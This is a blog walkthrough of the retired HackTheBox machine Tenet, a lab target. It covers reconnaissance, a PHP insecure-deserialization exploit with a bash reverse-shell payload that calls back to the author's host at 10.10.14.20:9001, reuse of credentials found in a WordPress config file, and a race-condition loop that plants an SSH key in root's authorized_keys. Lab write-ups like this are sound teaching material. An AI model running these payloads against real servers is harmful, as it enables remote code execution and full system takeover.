---
layout: walkthrough
title: HackTheBox - Tenet
date: 2021-06-13 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/tenet.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Tenet --`10.10.10.223`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Tenet$ nmap -sC -sV 10.10.10.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 10:48 EDT
Nmap scan report for 10.10.10.223
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.04 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine and I added `tenet.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by navigating to the web application:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img1.png"  style="width: 80%" />
</p>

Diving in to the source code, I saw that it had several links to the WordPress site, however the site was hosted on a different IP:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img2.png"  style="width: 80%" />
</p>

This could be as part of the message whereby they stated that they were moving their data over from a flat file structure to something a bit more substantial. I continued poking around the application and came across a comment by `neil`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img3.png"  style="width: 80%" />
</p>

Since I knew Sator was possibly missing, I decided to run a quick FFuF scan to determine if the subdomain existed:

<details>

```bash
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
vagrant@ko:~/Desktop/HackTheBox/Tenet$ ffuf -c -u http://tenet.htb/ -w sator.txt -H "Host: FUZZ.cache.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://tenet.htb/
 :: Wordlist         : FUZZ: sator.txt
 :: Header           : Host: FUZZ.cache.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

sator                   [Status: 200, Size: 10918, Words: 3499, Lines: 376]
:: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

</details>

The subdomain did exist! I added `sator.tenet.htb` to the `/etc/hosts` file and then tried navigating to the `sator.php` file referenced in the message which lead me to the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img4.png"  style="width: 60%" />
</p>

As shown above, some PHP code was executed but I didn't know what it did. I looked for the backup file (referenced in Neil's message) by adding the `.bak` extension and was able to successfully download the file from the server. The content of the file is provided below:

<details>

```php

<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();

?>

```
</details>

As shown above, the PHP code takes in a value based on the `arepo` parameter and uses the `unserialize` command. I did a quick Google search and came across the following blog post on how to exploit this: <https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a>.

> Insecure deserialization vulnerabilities happen when applications deserialize objects without proper sanitization. An attacker can then manipulate serialized objects to change the program’s flow.

Looking at the code above, it includes a `__destruct()` method which is what I will be abusing to achieve Remote Code Execution (RCE) because a user-provided object is passed into unserialize. I attempted to achieve RCE using this deserialization flaw by setting the `arepo` cookie to a serialized object with the hook property set to the `__destruct()` code.

To exploit this, I did the following:
1. Created the class DatabaseExport on my local machine and defined user_file to be a php file and the data to be a php reverse shell.
2. Serialize the defined class and pass it as input to the `arepo` variable.
3. The input gets passed to deserialize and a new instance of the class is created with our defined variables.
4. At the `__destruct()` function, the reverse shell gets written to the root of the web directory to the filename defined by the serealized object.

```python
class DatabaseExport {
  public $user_file = 'hotshoto.php';
  public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.20/9001 0>&1\'"); ?>';
  }

print urlencode(serialize(new DatabaseExport));
```

This produced the following URL encoded string:

```bash
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A12%3A%22hotshoto.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.20%2F9001+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

As the final step, I needed to browse to `http://sator.tenet.htb/sator.php?arepo=` and insert my URL encoded serialized object. From there, I needed to browse to `/hotshoto.php` which executed the payload.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img6.png"  style="width: 80%" />
</p>

## Lateral Movement using www-data

Since I was only in as the `www-data` user, I needed to try and find some way of elevating privileges. I started by looking through the various files within the directory and came across the WordPress config file (wp-config.php). Within the file, I found credentials for the neil user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img7.png"  style="width: 80%" />
</p>

I then changed users through the `su` command and gained access to `neil`. 

## Privilege Escalation using Neil

I started off by doing some basic enumeration and saw that the user was able to run sudo on `enableSSH.sh`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img8.png"  style="width: 80%" />
</p>

The file itself adds SSH keys to the root directories' authorized_keys file, so all I needed to do was add my key to the directory that the `addKey()` method refers to:

```python
addKey() {                      
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)                                                          
        (umask 110; touch $tmpName)                                   
        /bin/echo $key >>$tmpName                                     
        checkFile $tmpName                                        
        /bin/cat $tmpName >>/root/.ssh/authorized_keys            
        /bin/rm $tmpName                                                                              
}      

```

The file above takes in a SSH key with a random identifier and, if the file is valid, it adds it to root's authorized_keys file. This exploit relies on a Race Condition, if I was able to replace the file before the `checkFile` command is run, it would use my key instead of the one within the file. 


In order to exploit this, I launched 2 SSH sessions. Within the first terminal, I ran the following command to continuously create a SSH file: 

```bash
while true; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqhmEbPrWn8Ci8+lt7oDetVP7ERX0cYfmG630jVIj21dH2ScQgSM4Ml7+Am4WjjbmNIgerZawBRPWnA+hQMHnBWhhQiFojhaXmeuVBFi/YdfZO+5cD4+oyP/1n/Ua1O4S9yp+gFxR+fMoLOehsh5yzL16S0A8rbMtRHHvAvEF6FMc4pXQQrlH99sHVyb7ZpobCHKhvN9VwClt4Xr7cSw1KdkI8LKJj7J0XCr6kizc836SD3dxzCjTCKq/8MYn1mY/Ep8Oal0Tea66GW5bdAAtzYWidWMRjGaOwEOa3QS4bYVSudOmB6QrUoflv+3zBtBH/4LBSb1EbknRrAj5wPLFoeD8wtUJU7bPv2krDCrIRjMbfmQYGBwQV3JUcWGrBYDeGy0jDIyt1KHtlAJhAZD2gs/TPI6CzoV+6yoKI11tHoKhHhUMyoZ+tZgjd+ASMBAwlxNz0Ssi8omnSht3dRfPwXDKheksKlZFON+/ebGO5tRj0akntkLHJ52qRlnKGb5U= vagrant@ko" | tee /tmp/ssh-*; done
```
 
Within the second SSH terminal, I ran the `enableSSH` script in order to exploit the Race Condition:

```bash
#!/bin/bash
while true; do sudo /usr/local/bin/enableSSH.sh; done
```

After a few seconds, the key was added to the authorized_keys file and I was able to SSH in as root:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Tenet/img9.png"  style="width: 80%" />
</p>


That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.